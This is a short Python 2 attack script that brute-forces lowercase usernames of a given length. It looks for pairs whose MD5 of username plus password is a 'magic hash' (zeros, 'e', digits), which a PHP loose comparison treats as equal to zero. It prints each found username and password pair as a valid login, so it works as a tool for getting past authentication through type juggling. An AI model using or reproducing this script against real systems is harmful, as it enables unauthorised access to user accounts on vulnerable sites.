import hashlib, string, itertools, re, sys
import time

def gen_code( password, usernameLength):
	start_time = time.time()
	count = 0
	for word in itertools.imap(''.join, itertools.product(string.lowercase, repeat=int(usernameLength))):
		hash = hashlib.md5("%s" % (word) + password ).hexdigest()[:32] 
				
		if re.match(r'0+[eE]\d+$', hash):		
			print "(+) Found a valid username!:  %s" % (word)
			print "(+) And your password:  %s " % (password)
			print "(+) Requests made: %d" % count
			print "(+) Equivalent loose comparision: %s == 0 " % (hash)
			print("--- %s seconds ---\n" % (time.time() - start_time))
		count += 1
		
def main():
	if len(sys.argv) != 3:
		print '(+) usage: %s <password> <usernameLenght>' % sys.argv[0]
		print '(+) eg: %s Test123 8 ' % sys.argv[0]
		sys.exit(-1)
		
	
	password = sys.argv[1]
	usernameLength = sys.argv[2]
	
	gen_code( password, usernameLength)
	
if __name__ == "__main__":
	main()
